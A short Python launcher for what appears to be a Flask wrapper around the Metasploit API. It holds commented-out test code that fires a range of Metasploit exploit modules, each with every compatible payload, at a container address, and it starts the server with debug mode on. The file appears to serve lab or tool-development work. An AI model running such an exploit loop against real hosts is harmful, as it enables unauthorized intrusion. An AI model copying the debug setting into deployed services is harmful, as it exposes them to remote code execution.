from .flask_wrapper import flask_wrapper

# from metasploit.api.metasploit_manager.module_executor import Auxiliary, Exploit
#
#
# def results(test_client, uuid):
#     return test_client.call('module.results', [uuid])
#
# source_host = '18.190.159.190'
# # m = Metasploit(server=source_host, port=50000)
#
# target_host = '172.17.0.3'
# name = 'unix/irc/unreal_ircd_3281_backdoor'
# options = {'RHOSTS': target_host}
# m = Exploit(source_host=source_host, target=target_host)
# result = []
# for e in m.exploits[360:500]:
#     try:
#         exploit = m.metasploit_client.modules.use('exploit', mname=e)
#         if 'RHOSTS' in exploit.options:
#             exploit['RHOSTS'] = target_host
#             for p in exploit.targetpayloads():
#                 res = exploit.execute(payload=p)
#                 if res['job_id'] and res['job_id'] in m.metasploit_client.jobs.list:
#                     print(results(test_client=m.metasploit_client, uuid=res['uuid']))
#                 print(m.metasploit_client.jobs.list)
#                 print(res)
#
#     except Exception as e:
#         print(e)
#
# print(m.exploits)

flask_wrapper.run(debug=True)
# FlaskAppWrapper().run(host='127.0.0.1', debug=True)
